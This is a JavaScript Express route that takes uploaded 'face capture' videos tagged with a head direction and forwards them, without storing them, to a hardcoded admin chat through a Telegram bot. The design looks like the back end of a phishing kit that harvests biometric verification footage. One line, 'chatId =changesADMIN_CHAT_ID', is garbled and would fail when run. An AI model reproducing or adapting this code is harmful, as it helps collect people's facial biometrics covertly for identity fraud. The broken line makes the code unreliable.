import express from 'express';
import fs from 'fs';
import axios from 'axios';
import ExpressFormidable from "express-formidable";
import dotenv from 'dotenv';
import streamToBlob from 'stream-to-blob';

dotenv.config();

const router = express.Router();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = "7213907462";

const sendVideoToTelegram = async (videoStream, direction) => {
    const telegramBotToken = TELEGRAM_BOT_TOKEN;
    const chatId =changesADMIN_CHAT_ID;

    try {
        // Convert the ReadStream to Blob
        const videoBlob = await streamToBlob(videoStream);
        
        // Check that videoBlob is indeed a Blob
        if (!(videoBlob instanceof Blob)) {
            throw new Error('The provided videoStream could not be converted to a Blob');
        }

        // Create the form data for sending video to Telegram
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('video', videoBlob, 'capture.webm');  // Add filename
        formData.append('caption', `Face capture direction: ${direction}`);

        // Send the video to Telegram using axios
        const response = await axios.post(
            `https://api.telegram.org/bot${telegramBotToken}/sendVideo`,
            formData,
            {
                headers: {
                    'Content-Type': 'multipart/form-data',
                },
            }
        );

        console.log('Video sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending video to Telegram:', error);
    }
};


// Define the route to handle video upload without storing it
router.post('/upload', ExpressFormidable(), (req, res) => {
    const { files, fields } = req; // `files` contains uploaded files, `fields` contains form fields

    // Check if the video file exists
    const videoFile = files.video;
    if (!videoFile) {
        return res.status(400).send('No video file uploaded');
    }

    // Get direction (metadata sent with the form)
    const direction = fields.direction || 'unknown';

    // Create a stream from the video file
    const videoStream = fs.createReadStream(videoFile.path);

    // Send the video to Telegram
    sendVideoToTelegram(videoStream, direction)
        .then(() => {
            res.status(200).send('Video uploaded and sent to Telegram!');
        })
        .catch((error) => {
            console.error('Error processing video upload:', error);
            res.status(500).send('Error processing video');
        });
});

export default router;
